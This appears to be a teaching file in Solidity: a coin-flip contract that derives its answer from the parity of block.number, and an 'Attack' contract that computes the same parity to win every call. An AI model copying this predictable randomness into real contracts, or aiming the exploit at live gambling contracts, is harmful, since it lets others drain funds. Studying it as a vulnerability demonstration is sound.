//0xD7B39D86653a256FA57791a53992D3e2fBc843e3

pragma solidity 0.8.6;

contract Test11 {
    
    mapping(address => uint) public txCount;
    mapping(address => uint) public win;
    
    function gamble(bool _answer) public {
        uint blockNum = block.number;
        bool answer;
        
        if(blockNum % 2 == 1){
            answer = true;
        } else if (blockNum % 2 == 0) {
            answer = false;
        }
        
        txCount[msg.sender]++;
        
        if(answer == _answer){
            win[msg.sender]++;
        }
    }
    
}

contract Attack {
    function hack() public {
        uint blockNum = block.number;
        bool answer;
        
        if(blockNum % 2 == 1){
            answer = true;
        } else if (blockNum % 2 == 0) {
            answer = false;
        }
        Test11(0xd9145CCE52D386f254917e481eB44e9943F39138).gamble(answer);
    }
}